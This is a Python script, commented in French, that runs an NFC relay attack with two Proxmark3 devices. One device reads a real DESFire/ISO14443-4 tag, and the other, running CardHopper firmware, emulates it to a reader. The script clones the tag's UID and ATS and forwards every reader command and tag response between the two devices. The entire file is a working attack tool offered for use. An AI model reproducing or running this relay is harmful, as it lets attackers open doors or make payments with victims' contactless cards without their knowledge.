#!/usr/bin/env python3
"""
NFC Relay Attack - Proxmark3 x2 avec CardHopper
Architecture: Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0/CardHopper) <-> Lecteur

Protocole CardHopper (depuis hf_cardhopper.c) :
  Chaque paquet = 1 byte longueur + N bytes données
  
  PC -> Proxy : envoyer b'\x04CARD' pour passer en mode émulation
  PC -> Mole  : envoyer b'\x04READ' pour passer en mode reader
  
  Mode CARD (proxy) :
    PC -> Proxy : tagtype(1) + timemode(2) + uid + ats
    Proxy -> PC : trames reçues du lecteur (len + data)
    PC -> Proxy : réponses à envoyer au lecteur (len + data)
  
  Mode READ (mole) :
    Proxy -> PC : UID (len + data)
    Proxy -> PC : ATS (len + data)  
    PC -> Proxy : commandes à envoyer au tag (len + data)
    Proxy -> PC : réponses du tag (len + data)

  Codes spéciaux :
    b'\\xff' + b'END' = fin de session
    b'\\xff' + b'ERR' = erreur
    b'\\xfe'          = ACK
    b'RESTART'        = restart
"""

import serial
import struct
import time
import sys

# Ports
MOLE_PORT  = '/dev/ttyACM1'   # côté tag   - firmware normal
PROXY_PORT = '/dev/ttyACM0'   # côté lecteur - firmware CardHopper

BAUD = 115200

# Magic CardHopper
MAGIC_READ  = b'READ'
MAGIC_CARD  = b'CARD'
MAGIC_END   = b'\xff' + b'END'
MAGIC_ERR   = b'\xff' + b'ERR'
MAGIC_ACK   = b'\xfe'
MAGIC_RSRT  = b'RESTART'

# Constantes protocole PM3 normal (pour le mole)
COMMANDNG_PREAMBLE_MAGIC  = 0x61334d50
COMMANDNG_POSTAMBLE_MAGIC = 0x3361
RESPONSENG_PREAMBLE_MAGIC = 0x62334d50

CMD_PING                = 0x0109
CMD_HF_ISO14443A_READER = 0x0385
ISO14A_CONNECT          = (1 << 0)
ISO14A_NO_DISCONNECT    = (1 << 1)
ISO14A_RAW              = (1 << 3)
ISO14A_APPEND_CRC       = (1 << 4)

# ── CardHopper protocol (proxy side) ─────────────────────────────────────────

def ch_write_packet(ser, data):
    """Envoyer un paquet CardHopper : len(1) + data."""
    assert len(data) <= 255
    ser.write(bytes([len(data)]) + data)
    ser.flush()


def ch_read_packet(ser, timeout=5.0):
    """Lire un paquet CardHopper : len(1) + data. Retourne bytes ou None."""
    deadline = time.time() + timeout
    # Lire le byte de longueur
    while True:
        if time.time() > deadline:
            return None
        b = ser.read(1)
        if b:
            break
    length = b[0]
    if length == 0:
        return b''
    # Lire les données
    data = b''
    while len(data) < length:
        if time.time() > deadline:
            return None
        chunk = ser.read(length - len(data))
        if chunk:
            data += chunk
    return data

# ── PM3 protocol normal (mole side) ──────────────────────────────────────────

def send_mix(ser, cmd, arg0=0, arg1=0, arg2=0, data=b''):
    payload   = struct.pack('<QQQ', arg0, arg1, arg2) + data
    length_ng = len(payload) & 0x7FFF
    pkt  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    pkt += payload
    pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    ser.write(pkt)
    ser.flush()


def send_ng(ser, cmd, data=b''):
    length_ng = (len(data) & 0x7FFF) | (1 << 15)
    pkt  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    pkt += data
    pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    ser.write(pkt)
    ser.flush()


def read_pm3_response(ser, timeout=5.0, silent=False):
    deadline = time.time() + timeout
    raw = b''
    while len(raw) < 10:
        if time.time() > deadline:
            if not silent:
                print(f"  [MOLE] << TIMEOUT ({len(raw)}/10)")
            return None
        c = ser.read(10 - len(raw))
        if c:
            raw += c

    magic, length_ng, cmd, status, reason = struct.unpack('<IHHBB', raw)
    length = length_ng & 0x7FFF
    ng_bit = (length_ng >> 15) & 1

    if magic != RESPONSENG_PREAMBLE_MAGIC:
        ser.reset_input_buffer()
        return None

    payload = b''
    if length > 0:
        dl = time.time() + 3.0
        while len(payload) < length and time.time() < dl:
            payload += ser.read(length - len(payload))
    ser.read(2)

    args = (0, 0, 0)
    data_out = payload
    if not ng_bit and len(payload) >= 24:
        args = struct.unpack('<QQQ', payload[:24])
        data_out = payload[24:]

    return {'cmd': cmd, 'status': status, 'ng': ng_bit,
            'args': args, 'data': data_out}


def ping_mole(ser):
    d = bytes(range(32))
    send_ng(ser, CMD_PING, d)
    r = read_pm3_response(ser, timeout=3.0, silent=True)
    return r and r['data'] == d


def connect_tag(ser):
    """Détecte le tag via le mole. Retourne dict ou None."""
    send_mix(ser, CMD_HF_ISO14443A_READER, arg0=ISO14A_CONNECT | ISO14A_NO_DISCONNECT)
    resp = read_pm3_response(ser, timeout=5.0)
    if not resp or len(resp['data']) < 14:
        return None
    d = resp['data']
    uid_len = d[10]
    # iso14a_card_select_t :
    # uid[10], uidlen, atqa[2], sak, ats_len, ats[256]
    ats_len = d[14] if len(d) > 14 else 0
    ats = d[15:15+ats_len] if ats_len > 0 and len(d) > 15+ats_len else b''
    print(f"  [MOLE] ATS brut ({ats_len} bytes): {ats.hex()}")
    return {
        'uid':     d[0:uid_len],
        'atqa':    d[11:13],
        'sak':     d[13],
        'ats_len': ats_len,
        'ats':     ats
    }


def raw_to_tag(ser, raw_bytes):
    """Envoyer bytes bruts au tag via le mole. Reconnecte si le champ est tombé."""
    flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=flags, arg1=len(raw_bytes), data=raw_bytes)
    resp = read_pm3_response(ser, timeout=0.5, silent=True)
    
    # Si la réponse contient "Warning" ou est vide, reconnecter et réessayer
    if resp and resp['data'] and b'Warning' in resp['data']:
        # Reconnecter le tag
        send_mix(ser, CMD_HF_ISO14443A_READER, arg0=ISO14A_CONNECT | ISO14A_NO_DISCONNECT)
        read_pm3_response(ser, timeout=3.0, silent=True)
        # Réessayer la commande
        send_mix(ser, CMD_HF_ISO14443A_READER,
                 arg0=flags, arg1=len(raw_bytes), data=raw_bytes)
        resp = read_pm3_response(ser, timeout=0.5, silent=True)
    
    return resp

# ── Relay ─────────────────────────────────────────────────────────────────────

class CardHopperRelay:

    def __init__(self):
        print(f"[*] Ouverture Mole  (tag)    : {MOLE_PORT}")
        self.mole  = serial.Serial(MOLE_PORT,  baudrate=BAUD, timeout=0.1)
        print(f"[*] Ouverture Proxy (lecteur) : {PROXY_PORT}  [CardHopper]")
        self.proxy = serial.Serial(PROXY_PORT, baudrate=BAUD, timeout=0.1)
        time.sleep(0.3)
        self.mole.reset_input_buffer();  self.mole.reset_output_buffer()
        self.proxy.reset_input_buffer(); self.proxy.reset_output_buffer()

    def close(self):
        try:
            # Envoyer END au proxy pour sortir proprement
            ch_write_packet(self.proxy, MAGIC_END)
        except: pass
        try: self.mole.close()
        except: pass
        try: self.proxy.close()
        except: pass

    def init(self):
        print("\n=== Vérification mole (PM3 normal) ===")
        if not ping_mole(self.mole):
            print("[ERREUR] Mole ne répond pas au ping !")
            return False
        print("  [MOLE] PING OK ✓")

        print("\n[MOLE] Détection du tag réel...")
        card = connect_tag(self.mole)
        if not card:
            print("[ERREUR] Aucun tag détecté sur le mole !")
            return False

        self.uid  = card['uid']
        self.atqa = card['atqa']
        self.sak  = card['sak']
        self.ats  = card['ats']
        print(f"  [MOLE] Tag OK !")
        print(f"         UID  : {':'.join(f'{b:02X}' for b in self.uid)}")
        print(f"         ATQA : {self.atqa.hex().upper()}")
        print(f"         SAK  : {self.sak:02X}")

        print("\n[PROXY] Activation mode standalone (CardHopper)...")
        CMD_STANDALONE = 0x0115
        standalone_payload = bytes([1, 0]) + bytes(10)
        send_ng(self.proxy, CMD_STANDALONE, standalone_payload)
        # Attendre que le PM3 bascule vraiment en mode standalone
        time.sleep(2.0)
        # Vider tout ce qui arrive pendant le démarrage
        self.proxy.reset_input_buffer()
        time.sleep(0.5)

        print("[PROXY] Démarrage CardHopper en mode CARD...")
        # Envoyer le mode CARD
        ch_write_packet(self.proxy, MAGIC_CARD)
        time.sleep(0.1)

        # Desfire : tagtype=4 (ISO14443-4), timemode standard
        tagtype = 4
        ch_write_packet(self.proxy, bytes([tagtype]))
        print(f"  [PROXY] tagtype={tagtype} (ISO14443-4 / Desfire)")

        # Envoyer timemode (fwi=8, sfgi=0 = valeurs standard)
        ch_write_packet(self.proxy, bytes([0x80, 0x00]))

        # Envoyer UID
        ch_write_packet(self.proxy, self.uid)
        print(f"  [PROXY] UID envoyé: {self.uid.hex().upper()}")

        # ATS : utiliser celui du vrai tag si disponible, sinon ATS Desfire minimal
        # Format CardHopper : dat[0] doit être égal à len total (lui-même inclus)
        ats = self.ats
        if ats and len(ats) > 0 and len(ats) <= 255:
            # Vérifier que dat[0] == len total
            if ats[0] != len(ats):
                ats = bytes([len(ats)]) + ats[1:]
            ats_data = ats
        else:
            # ATS Desfire minimal : len=6, T0=0x75, TA=0x80, TB=0x60, TC=0x02
            ats_data = bytes([0x06, 0x75, 0x80, 0x60, 0x02, 0x00])
        ch_write_packet(self.proxy, ats_data)
        print(f"  [PROXY] ATS envoyé: {ats_data.hex()}")

        # Lire tout ce que le proxy renvoie pendant 2 secondes (debug)
        print("  [PROXY] En attente de réponse du CardHopper...")
        deadline = time.time() + 2.0
        while time.time() < deadline:
            b = self.proxy.read(256)
            if b:
                print(f"  [PROXY RAW] {b.hex()}")
                deadline = time.time() + 1.0  # reset si on reçoit qqch

        print("[PROXY] CardHopper prêt.")
        return True

    def relay_loop(self):
        print("\n=== RELAY LOOP ===")
        print("Approche le téléphone du PROXY. Ctrl+C pour arrêter.\n")

        n = 0
        wait = 0

        try:
            while True:
                frame = ch_read_packet(self.proxy, timeout=0.05)

                if frame is None:
                    wait += 1
                    if wait % 200 == 0:
                        print("  [~] En attente du lecteur...")
                    continue

                wait = 0

                if frame == MAGIC_ERR or frame == MAGIC_RSRT or len(frame) == 0:
                    continue
                # Filtrer trames parasites (trop longues ou que des zéros)
                if len(frame) > 50 or frame == bytes(len(frame)):
                    continue

                n += 1
                print(f"\n=== Échange #{n} ===")
                print(f"  LECTEUR -> PROXY : {frame.hex()}")

                # RATS (e0 xx) : CardHopper le gère en interne normalement
                # mais si on le reçoit, on répond avec l'ATS du vrai tag
                if len(frame) >= 1 and frame[0] == 0xe0:
                    print(f"  [RATS] -> ATS: {self.ats.hex()}")
                    ch_write_packet(self.proxy, self.ats)
                    continue

                # Forward au tag
                resp = raw_to_tag(self.mole, frame)
                tag_frame = self._extract_tag_response(resp)

                if tag_frame:
                    print(f"  TAG    -> MOLE   : {tag_frame.hex()}")
                    ch_write_packet(self.proxy, tag_frame)
                    print(f"  PROXY  -> LECTEUR: {tag_frame.hex()}")
                else:
                    print(f"  TAG    -> MOLE   : (pas de réponse valide)")
                    ch_write_packet(self.proxy, MAGIC_ERR)

        except KeyboardInterrupt:
            print("\n\n[RELAY] Arrêt propre.")

    def _extract_tag_response(self, resp):
        """Extraire la vraie réponse du tag, filtrer les parasites."""
        if not resp:
            return None
        d = resp['data']
        if not d or len(d) == 0:
            return None
        if len(d) == 271:        # iso14a_card_select_t = reconnexion parasite
            return None
        if len(d) >= 255:        # buffer PM3 vide
            return None
        if d == bytes(len(d)):   # que des zéros = champ éteint
            return None
        if b'Warning' in d:      # message d'erreur PM3
            return None
        return d

    def run(self):
        print("\n" + "=" * 62)
        print("  NFC RELAY  |  CardHopper  |  Proxmark3 x2")
        print("  Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Lecteur")
        print("=" * 62)
        if not self.init():
            return
        self.relay_loop()


if __name__ == '__main__':
    relay = CardHopperRelay()
    try:
        relay.run()
    finally:
        relay.close()
        print("[*] Ports fermés.")